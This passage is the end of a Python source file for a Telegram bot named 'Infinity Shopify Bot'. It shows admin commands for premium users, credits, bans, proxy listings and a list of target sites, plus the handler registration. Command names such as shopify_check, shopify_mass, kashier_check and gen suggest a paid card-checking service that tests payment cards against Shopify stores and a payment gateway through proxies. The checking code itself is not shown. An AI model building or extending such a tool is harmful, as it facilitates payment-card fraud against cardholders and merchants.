        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('No premium users found!')}", parse_mode="HTML")
        return
    
    text = f"{get_emoji_text('vip')} {to_bold(f'Premium Users ({len(premium_users)}):')}\n\n"
    for i, user in enumerate(premium_users, 1):
        plan_icon = get_emoji_text('crown') if user['plan'] in ['Owner', 'Admin'] else get_emoji_text('premium')
        credits_display = "∞" if user['plan'] in ['Owner', 'Admin'] else user['credits']
        text += f"""{i}. {plan_icon} @{user['username']} | {user['plan']}
   {get_emoji_text('id')} <code>{user['user_id']}</code> | {get_emoji_text('credit')} {credits_display} | {get_emoji_text('proxy')} {user['proxy']}\n\n"""
    await update.message.reply_text(text, parse_mode="HTML")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('ban')} {to_bold('Usage: /ban [user_id]')}", parse_mode="HTML")
        return
    
    try:
        target_id = int(args[1])
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid ID!')}", parse_mode="HTML")
        return
    
    if target_id == OWNER_ID:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Cannot ban owner!')}", parse_mode="HTML")
        return
    
    ban_user(target_id)
    await update.message.reply_text(f"{get_emoji_text('ban')} {to_bold('User Banned!')}\n\n{to_bold(f'User {target_id} is now banned.')}", parse_mode="HTML")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('unban')} {to_bold('Usage: /unban [user_id]')}", parse_mode="HTML")
        return
    
    try:
        target_id = int(args[1])
    except:
        await update.message.reply_text(f"{get_emoji_text('check_no')} {to_bold('Invalid ID!')}", parse_mode="HTML")
        return
    
    unban_user(target_id)
    await update.message.reply_text(f"{get_emoji_text('unban')} {to_bold('User Unbanned!')}\n\n{to_bold(f'User {target_id} is now unbanned.')}", parse_mode="HTML")

async def users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    save_users_json()
    with open(USERS_FILE, 'rb') as f:
        await update.message.reply_document(f, caption=f"{get_emoji_text('user')} {to_bold('Users Data')}")

async def add_site_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    args = update.message.text.split()
    if len(args) < 2:
        await update.message.reply_text(f"{get_emoji_text('site')} {to_bold('Usage: /add_site [url]')}", parse_mode="HTML")
        return
    
    site = args[1].strip().rstrip('/')
    site = site.replace('http://', '').replace('https://', '')
    sites = load_sites()
    if site not in sites:
        with open(SITES_FILE, 'a') as f:
            f.write(f"\n{site}")
        await update.message.reply_text(f"{get_emoji_text('success')} {to_bold('Site Added!')}\n\n{get_emoji_text('site')} {site}", parse_mode="HTML")
    else:
        await update.message.reply_text(f"{get_emoji_text('warning')} {to_bold('Site already exists!')}", parse_mode="HTML")

async def sites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    sites = load_sites()
    text = f"{get_emoji_text('site')} {to_bold(f'Sites ({len(sites)}):')}\n\n"
    for i, site in enumerate(sites, 1):
        text += f"{i}. {site}\n"
    await update.message.reply_text(text, parse_mode="HTML")

async def admin_cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Admin only!')}", parse_mode="HTML")
        return
    
    await update.message.reply_text(get_admin_panel_text(), parse_mode="HTML")

async def turn_off_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        await update.message.reply_text(f"{get_emoji_text('lock')} {to_bold('Owner Only!')}", parse_mode="HTML")
        return
    
    global BOT_MAINTENANCE
    BOT_MAINTENANCE = not BOT_MAINTENANCE
    
    status = "ON" if not BOT_MAINTENANCE else "OFF"
    status_text = "🟢 Bot is now ON" if not BOT_MAINTENANCE else "🔴 Bot is now OFF (Maintenance Mode)"
    
    await update.message.reply_text(f"""{get_emoji_text('info')} {to_bold('Bot Status Changed')}

{get_emoji_text('admin')} {to_bold('New Status:')} {status_text}
{get_emoji_text('time')} {to_bold('Time:')} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{get_emoji_text('user')} {to_bold('By:')} @{update.effective_user.username or 'Owner'}""", parse_mode="HTML")

def main():
    logger.info("=" * 50)
    logger.info("  Infinity Shopify Bot Started!")
    logger.info(f"  Owner ID: {OWNER_ID}")
    logger.info(f"  Sites File: {SITES_FILE}")
    logger.info(f"  Required Channel ID: {REQUIRED_CHANNEL_ID}")
    logger.info("=" * 50)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("sh", shopify_check_command))
    app.add_handler(CommandHandler("ms", shopify_mass_command))
    app.add_handler(CommandHandler("kh", kashier_check_command))
    app.add_handler(CommandHandler("gen", gen_command))
    app.add_handler(CommandHandler("balance", balance_command))
    app.add_handler(CommandHandler("me", me_command))
    app.add_handler(CommandHandler("add_proxy", add_proxy_command))
    app.add_handler(CommandHandler("show_proxy", show_proxy_command))
    app.add_handler(CommandHandler("del_proxy", del_proxy_command))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("admin", admin_command))
    app.add_handler(CommandHandler("remove", remove_command))
    app.add_handler(CommandHandler("premium_users", premium_users_command))
    app.add_handler(CommandHandler("ban", ban_command))
    app.add_handler(CommandHandler("unban", unban_command))
    app.add_handler(CommandHandler("users", users_command))
    app.add_handler(CommandHandler("add_site", add_site_command))
    app.add_handler(CommandHandler("sites", sites_command))
    app.add_handler(CommandHandler("turn_off", turn_off_command))
    app.add_handler(CommandHandler("admin_cmds", admin_cmds_command))
    
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
